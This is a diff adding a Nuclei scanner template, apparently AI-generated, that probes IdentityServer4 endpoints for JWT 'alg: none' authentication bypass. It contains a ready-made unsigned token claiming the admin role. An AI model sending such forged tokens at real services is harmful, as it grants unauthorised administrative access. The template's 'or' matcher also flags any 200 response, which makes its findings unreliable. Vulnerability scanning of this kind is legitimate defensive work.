@@ -1,0 +1,35 @@
+id: identityserver4-auth-bypass
+
+info:
+  name: IdentityServer4 JWT Auth Bypass
+  author: nuclei-template-gpt
+  severity: high
+  description: >
+    Detects possible authentication bypass in IdentityServer4 by sending an unsigned JWT token (alg: none).
+    This template assumes the backend accepts JWTs without validating the signature.
+  reference:
+    - https://www.identityserver.com/articles/famous-jwt-bugs/
+    - https://portswigger.net/daily-swig/none-alg-jwt-vulnerability-resurfaces-in-open-source-authentication-software
+  tags: jwt,auth-bypass,identityserver4,token
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/protected/resource"
+
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+
+    payloads:
+      jwt_token:
+        - eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsIm5iZiI6MTYyMDY1NzAwMCwiZXhwIjoxOTM2MDU3MDAwfQ.
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "admin"
+        part: body
+        condition: or
